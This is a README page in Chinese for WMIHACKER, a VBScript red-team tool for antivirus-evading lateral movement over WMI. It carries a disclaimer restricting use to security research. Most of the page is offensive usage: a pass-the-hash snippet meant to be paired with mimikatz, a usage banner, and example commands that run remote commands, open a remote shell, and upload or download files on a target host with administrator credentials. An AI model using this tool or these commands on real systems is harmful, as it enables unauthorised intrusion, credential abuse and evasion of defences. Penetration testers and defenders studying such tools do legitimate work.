## WMIHACKER <https://github.com/rootclay/WMIHACKER>
<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
![Language](https://img.shields.io/badge/Language-VBScript-blue)
![Author](https://img.shields.io/badge/Author-rootclay-orange)
![GitHub stars](https://img.shields.io/github/stars/rootclay/WMIHACKER.svg?style=flat&logo=github)
![Version](https://img.shields.io/badge/Version-V0.0.1-red)
![Time](https://img.shields.io/badge/Join-20221117-green)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->

> 免责声明：本项目涉及的技术仅供安全学习与研究防御用途，禁止非法使用！

免杀横向移动命令执行测试工具(无需445端口)

介绍：免杀横向渗透远程命令执行，常见的WMIEXEC、PSEXEC执行命令是创建服务或调用Win32_Process.create执行命令，这些方式都已经被杀软100%拦截，通过改造出WMIHACKER免杀横向移动测试工具。(无需445端口)

主要功能：1、命令执行；2、文件上传；3、文件下载；4、PTH使用

## 使用
合并[Issue 1](https://github.com/360-Linton-Lab/WMIHACKER/issues/1)里PTH的使用方法：

```vbscript
第54-58行代码：

if user = "-" And pass = "-" Then
set objWMIService = objLocator.connectserver(host,"root/cimv2")
Set SubobjSWbemServices = objLocator.ConnectServer(host, "root\subscription")
Set regWMIService = objLocator.ConnectServer(host, "root\default")

用户名和密码填“-”，结合mimikatz的PTH就可以进行WMI的PTH了。
```

```
C:\Users\administrator\Desktop>cscript //nologo WMIHACKER_0.6.vbs

__          ____  __ _____   _    _          _____ _  ________ _____
\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \
 \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |
  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  < |  __| |  _  /
   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \
    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\
                              v0.6beta       By. Xiangshan@360RedTeam
Usage:
        WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?

        WMIHACKER.vbs  /shell  host  user  pass

        WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath

        WMIHACKER.vbs  /download  host  user  pass  localpath remotepath

          /cmd          single command mode
          host          hostname or IP address
          GETRES?       Res Need Or Not, Use 1 Or 0
          command       the command to run on remote host
```

有命令回显执行方式

`> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo" 1`

无命令回显

`> cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator "Password!" "systeminfo > c:\1.txt" 0`

模拟shell模式

`> cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator "Password!" `

文件上传-复制本机calc.exe到远程主机c:\calc.exe

`> cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator "Password!" "c:\windows\system32\calc.exe" "c:\calc"`

文件下载-下载远程主机calc.exe到本地c:\calc.exe

`> cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator "Password!" "c:\calc" "c:\windows\system32\calc.exe" `


<!--auto_detail_active_begin_e1c6fb434b6f0baf6912c7a1934f772b-->
## 项目相关


## 最近更新

<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
